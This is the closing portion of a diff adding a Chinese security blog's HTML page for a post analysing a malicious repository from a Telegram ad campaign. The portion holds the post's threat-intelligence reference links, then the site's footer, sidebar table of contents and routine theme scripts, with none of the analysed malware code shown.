+<p><a href="https://www.joesandbox.com/analysis/370722/0/html" target="_blank" rel="noopener">https://www.joesandbox.com/analysis/370722/0/html</a></p>
+<p><a href="https://www.joesandbox.com/analysis/370720/0/html" target="_blank" rel="noopener">https://www.joesandbox.com/analysis/370720/0/html</a></p>
+<p><a href="https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/operation-ta505-part2/" target="_blank" rel="noopener">https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/operation-ta505-part2/</a></p>
+<p><a href="https://gist.github.com/gabemarshall/f25afd533b341e1b21bc39f8e26946b7" target="_blank" rel="noopener">https://gist.github.com/gabemarshall/f25afd533b341e1b21bc39f8e26946b7</a></p>
+<p><a href="https://www.binarydefense.com/an-updated-servhelper-tunnel-variant/" target="_blank" rel="noopener">https://www.binarydefense.com/an-updated-servhelper-tunnel-variant/</a></p>
+<p><a href="https://attack.mitre.org/groups/G0092/" target="_blank" rel="noopener">https://attack.mitre.org/groups/G0092/</a></p>
+</span>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/windows/" rel="tag">#windows</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/jishu.html" rel="prev">即刻安全纯技术交流群</a>
+            
+</div>
+
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/powershell横向渗透样本分析.html" rel="next">powershell横向渗透样本分析</a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div>
+      
+        <style type="text/css">
+
+    .donate_bar {
+        text-align: center;
+        margin-top : 5%;
+    }
+
+    .donate_bar.hidden {
+        display:none;
+    }
+/*
+    .donate_bar a.btn_donate {
+        display: inline-block;
+        width: 82px;
+        height: 82px;
+        margin-left:auto;
+        margin-right:auto;
+
+        background: url("http://img.t.sinajs.cn/t5/style/images/apps_PRF/e_media/btn_reward.gif") no-repeat;
+        _background: url("http://img.t.sinajs.cn/t5/style/images/apps_PRF/e_media/btn_reward.gif") no-repeat; 
+
+        -webkit-transition: background 0s;
+        -moz-transition: background 0s;
+        -o-transition: background 0s;
+        -ms-transition: background 0s;
+        transition: background 0s;
+    }
+*/
+    .donate_bar a.btn_donate:hover { 
+        // background-position: 0px -82px;
+        color: #87daff
+    }
+
+    .donate_bar .donate_txt {
+        display: block;
+        color: #9d9d9d;
+        font: 14px/2 "Microsoft Yahei";
+    }
+
+    .bold { 
+        font-weight: bold; 
+    }
+
+    .post-donate a {
+        border-bottom: 0px;
+    }
+
+    #donate_guide table {
+        border: none;
+    }
+
+    #donate_guide td {
+        border-bottom: none;
+        border-right: none;
+        background: #333333;
+        valign: top;
+    }
+
+</style>
+
+
+
+    
+
+    <div class="post-donate">
+        <div id="donate_board" class="donate_bar center">
+              <a id="btn_donate" class="btn_donate" href="javascript:;" title="打赏">赏</a>
+              <span id="donate_txt" class="donate_txt">
+                   
+                        欢迎加入即刻安全和低调群
+                   
+              </span>
+            <br>
+        </div>  
+  
+        <div id="donate_guide" class="donate_bar center hidden">
+            <!--
+            
+                <a href="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715250891.jpg" title="支付宝打赏" class="fancybox" rel="article0" 
+                    style="float:left;margin-left:25%;margin-right:10px;">
+                    <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715250891.jpg" title="" height="164px" width="164px">
+                </a> 
+              
+
+            
+                <a href="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715240236.jpg" title="微信打赏" class="fancybox" rel="article0"
+                    style="margin-right:30%">
+                    <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715240236.jpg" title="" height="164px" width="164px">
+                </a>
+            
+            -->
+            <table>
+                <tr>
+                    <td>
+                        
+                            <a href="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715250891.jpg" title="支付宝打赏" class="fancybox" rel="article0" style="float:left;margin-left:25%;margin-right:10px;">
+                                <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715250891.jpg" title height="164px" width="164px">
+                            </a> 
+                         
+                    </td>
+                    <td>
+                        
+                            <a href="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715240236.jpg" title="微信打赏" class="fancybox" rel="article0" style="margin-right:30%">
+                                <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715240236.jpg" title height="164px" width="164px">
+                            </a>
+                        
+                    </td>
+                </tr>
+            </table>
+
+        </div>
+
+        <script type="text/javascript">
+            document.getElementById('btn_donate').onclick = function() {
+                $('#donate_board').addClass('hidden');
+                // $('#donate_guide').removeClass('hidden');
+                $('#donate_guide').show(2000);
+            }
+
+        </script>
+    </div>
+
+    
+
+
+      
+    </div>
+
+    <div class="post-spread">
+      
+        <div class="bdsharebuttonbox">
+	<a href="#" class="bds_more" data-cmd="more"></a>
+	<a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+	<a href="#" class="bds_tqq" data-cmd="tqq" title="分享到腾讯微博"></a>
+	<a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+</div>
+<script>
+    window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"1","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+      
+    </div>
+  </div>
+
+ </div>
+
+        
+
+        
+          <div class="comments" id="comments">
+            
+              <div class="ds-thread" data-thread-key="Telegram恶意广告活动之恶意仓库分析.html" data-title="Telegram恶意广告活动之恶意仓库分析" data-url="www.ggsec.cn/Telegram恶意广告活动之恶意仓库分析.html">
+              </div>
+            
+          </div>
+        
+      </div>
+
+      
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" src="/images/default_avatar.jpg" alt="Demon‘blog | 没有绝对安全的系统" itemprop="image">
+          <p class="site-author-name" itemprop="name">Demon‘blog | 没有绝对安全的系统</p>
+        </div>
+        <p class="site-description motion-element" itemprop="description">kali|linux|sec|Web|MSF|Win</p>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">171</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          <div class="site-state-item site-state-categories">
+            
+              <span class="site-state-item-count">8</span>
+              <span class="site-state-item-name">分类</span>
+              
+          </div>
+
+          <div class="site-state-item site-state-tags">
+            <a href="/tags">
+              <span class="site-state-item-count">14</span>
+              <span class="site-state-item-name">标签</span>
+              </a>
+          </div>
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="menu-item-icon icon-next-feed"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="http://www.secist.com" target="_blank">即刻安全</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.airs-sec.com" target="_blank">小城工作室</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://linux.dog" target="_blank">泡泡博客</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://www.webshell.ren" target="_blank">THE博客</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://isbase.cc/" target="_blank">zusheng</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/demonsec666" target="_blank">Demon(Github)</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.inksec.cn" target="_blank">Szrzvdny</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.xsafe.org/" target="_blank">xsafe</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.sqlsec.com" target="_blank">国光</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://droidkali.github.io" target="_blank">记忆纯真</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.frostsaber.com/" target="_blank">FrostsaberX 's Blog</a>
+              </span>
+            
+          
+        </div>
+<div class="links-of-friendly motion-element">
+          
+        </div>
+
+        
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap sidebar-panel-active">
+          <div class="post-toc-indicator-top post-toc-indicator"></div>
+          <div class="post-toc">
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-起源"><span class="nav-number">1.</span> <span class="nav-text">1.起源</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-bitbucker发现"><span class="nav-number">2.</span> <span class="nav-text">2.bitbucker发现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-powershell脚本分析"><span class="nav-number">3.</span> <span class="nav-text">3.powershell脚本分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#3-1-bat"><span class="nav-number">3.1.</span> <span class="nav-text">3.1 bat</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-2-mae-ps1"><span class="nav-number">3.2.</span> <span class="nav-text">3.2 mae.ps1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-3-start-vbs"><span class="nav-number">3.3.</span> <span class="nav-text">3.3  start.vbs</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-4-ready-ps1"><span class="nav-number">3.4.</span> <span class="nav-text">3.4 ready.ps1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-5-Get-Conten-ps1"><span class="nav-number">3.5.</span> <span class="nav-text">3.5 Get-Conten.ps1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-部署"><span class="nav-number">3.6.</span> <span class="nav-text">4.部署</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-IOC"><span class="nav-number">4.</span> <span class="nav-text">4.IOC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#链接："><span class="nav-number">5.</span> <span class="nav-text">链接：</span></a></li></ol></div>
+            
+          </div>
+          <div class="post-toc-indicator-bottom post-toc-indicator"></div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner"> <div class="copyright">
+  
+  &copy; &nbsp; 
+  <span itemprop="copyrightYear">2021
+  </span>
+  <span class="with-love">
+    <i class="icon-next-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Demon‘blog | 没有绝对安全的系统
+  </span>
+</div>
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="http://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme by <a class="theme-link" href="http://blog.idhyt.com">idhyt</a>.<a class="theme-link" href="https://github.com/idhyt/hexo-theme-next/tree/magiclamp">Mala</a>
+</div>
+
+<!-- busuanzi -->
+
+  <div class="busuanzi-info">
+    <div class="theme-info">
+    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+    </script>
+    <span id="busuanzi_container_site_pv">
+        本站总访问量<a class="theme-link"><span id="busuanzi_value_site_pv"></span></a>次 |
+	本站访客数<span id="busuanzi_value_site_uv"></span>人次
+    </span>
+</div>
+
+  </div>
+
+
+
+ </div>
+    </footer>
+
+    <div class="back-to-top"></div>
+  </div>
+
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+  
+    
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"demonsec"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+    
+
+    
+  
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.5.1"></script>
+
+
+  <script type="text/javascript" src="/js/helpers.js?v=0.4.5.1"></script>
+  
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+  <script type="text/javascript" src="/js/motion_global.js?v=0.4.5.1" id="motion.global"></script>
+
+
+
+
+  <script type="text/javascript" src="/js/nav-toggle.js?v=0.4.5.1"></script>
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  
+<script type="text/javascript" src="/js/bootstrap.scrollspy.js?v=0.4.5.1" id="bootstrap.scrollspy.custom"></script>
+
+
+<script type="text/javascript" id="sidebar.toc.highlight">
+  $(document).ready(function () {
+    var tocSelector = '.post-toc';
+    var $tocSelector = $(tocSelector);
+    var activeCurrentSelector = '.active-current';
+
+    $tocSelector
+      .on('activate.bs.scrollspy', function () {
+        var $currentActiveElement = $(tocSelector + ' .active').last();
+
+        removeCurrentActiveClass();
+        $currentActiveElement.addClass('active-current');
+
+        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
+      })
+      .on('clear.bs.scrollspy', function () {
+        removeCurrentActiveClass();
+      });
+
+    function removeCurrentActiveClass () {
+      $(tocSelector + ' ' + activeCurrentSelector)
+        .removeClass(activeCurrentSelector.substring(1));
+    }
+
+    function processTOC () {
+      getTOCMaxHeight();
+      toggleTOCOverflowIndicators();
+    }
+
+    function getTOCMaxHeight () {
+      var height = $('.sidebar').height() -
+                   $tocSelector.position().top -
+                   $('.post-toc-indicator-bottom').height();
+
+      $tocSelector.css('height', height);
+
+      return height;
+    }
+
+    function toggleTOCOverflowIndicators () {
+      tocOverflowIndicator(
+        '.post-toc-indicator-top',
+        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
+      );
+
+      tocOverflowIndicator(
+        '.post-toc-indicator-bottom',
+        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
+      )
+    }
+
+    $(document).on('sidebar.motion.complete', function () {
+      processTOC();
+    });
+
+    $('body').scrollspy({ target: tocSelector });
+    $(window).on('resize', function () {
+      if ( $('.sidebar').hasClass('sidebar-active') ) {
+        processTOC();
+      }
+    });
+
+    onScroll($tocSelector);
+
+    function onScroll (element) {
+      element.on('mousewheel DOMMouseScroll', function (event) {
+          var oe = event.originalEvent;
+          var delta = oe.wheelDelta || -oe.detail;
+
+          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
+          event.preventDefault();
+
+          toggleTOCOverflowIndicators();
+      });
+    }
+
+    function tocOverflowIndicator (indicator, action) {
+      var $indicator = $(indicator);
+      var opacity = action === 'show' ? 0.4 : 0;
+      $indicator.velocity ?
+        $indicator.velocity('stop').velocity({
+          opacity: opacity
+        }, { duration: 100 }) :
+        $indicator.stop().animate({
+          opacity: opacity
+        }, 100);
+    }
+
+  });
+</script>
+
+<script type="text/javascript" id="sidebar.nav">
+  $(document).ready(function () {
+    var html = $('html');
+    var TAB_ANIMATE_DURATION = 200;
+    var hasVelocity = $.isFunction(html.velocity);
+
+    $('.sidebar-nav li').on('click', function () {
+      var item = $(this);
+      var activeTabClassName = 'sidebar-nav-active';
+      var activePanelClassName = 'sidebar-panel-active';
+      if (item.hasClass(activeTabClassName)) {
+        return;
+      }
+
+      var currentTarget = $('.' + activePanelClassName);
+      var target = $('.' + item.data('target'));
+
+      hasVelocity ?
+        currentTarget.velocity('transition.slideUpOut', TAB_ANIMATE_DURATION, function () {
+          target
+            .velocity('stop')
+            .velocity('transition.slideDownIn', TAB_ANIMATE_DURATION)
+            .addClass(activePanelClassName);
+        }) :
+        currentTarget.animate({ opacity: 0 }, TAB_ANIMATE_DURATION, function () {
+          currentTarget.hide();
+          target
+            .stop()
+            .css({'opacity': 0, 'display': 'block'})
+            .animate({ opacity: 1 }, TAB_ANIMATE_DURATION, function () {
+              currentTarget.removeClass(activePanelClassName);
+              target.addClass(activePanelClassName);
+            });
+        });
+
+      item.siblings().removeClass(activeTabClassName);
+      item.addClass(activeTabClassName);
+    });
+
+    $('.post-toc a').on('click', function (e) {
+      e.preventDefault();
+      var targetSelector = escapeSelector(this.getAttribute('href'));
+      var offset = $(targetSelector).offset().top;
+      hasVelocity ?
+        html.velocity('stop').velocity('scroll', {
+          offset: offset  + 'px',
+          mobileHA: false
+        }) :
+        $('html, body').stop().animate({
+          scrollTop: offset
+        }, 500);
+    });
+
+    // Expand sidebar on post detail page by default, when post has a toc.
+    var $tocContent = $('.post-toc-content');
+    if (isDesktop() && CONFIG.sidebar === 'post') {
+      if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
+        displaySidebar();
+      }
+    }
+  });
+</script>
+
+
+
+  <script type="text/javascript">
+    $(document).ready(function () {
+      if (CONFIG.sidebar === 'always') {
+        displaySidebar();
+      }
+      if (isMobile()) {
+        FastClick.attach(document.body);
+      }
+    });
+  </script>
+
+  
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/lazyload.js"></script>
+  <script type="text/javascript">
+    $(function () {
+      $("#posts").find('img').lazyload({
+        placeholder: "/images/loading.gif",
+        effect: "fadeIn"
+      });
+    });
+  </script>
+</body>
+</html>
